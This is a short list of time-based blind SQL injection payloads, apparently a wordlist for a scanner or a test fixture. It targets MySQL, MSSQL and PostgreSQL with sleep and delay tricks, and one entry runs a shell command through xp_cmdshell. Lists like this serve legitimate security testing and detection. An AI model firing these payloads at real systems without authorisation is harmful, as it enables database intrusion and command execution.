  - "'; IF (1=1) WAITFOR DELAY '0:0:5'--"
  - "1 AND SLEEP(5)--"
  - "' AND SLEEP(5)#"
  - "\" AND SLEEP(5)--"
  - "1) AND SLEEP(5)--"
  - "1)) AND SLEEP(5)--"
  - "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--"
  - "'; EXEC master..xp_cmdshell('ping 127.0.0.1 -n 5')--"
  - "1; WAITFOR DELAY '0:0:5'; --"
  - "' OR SLEEP(5)--"
  - "') OR SLEEP(5)--"
  - "1 OR SLEEP(5)--"
  - "' AND pg_sleep(5)--"
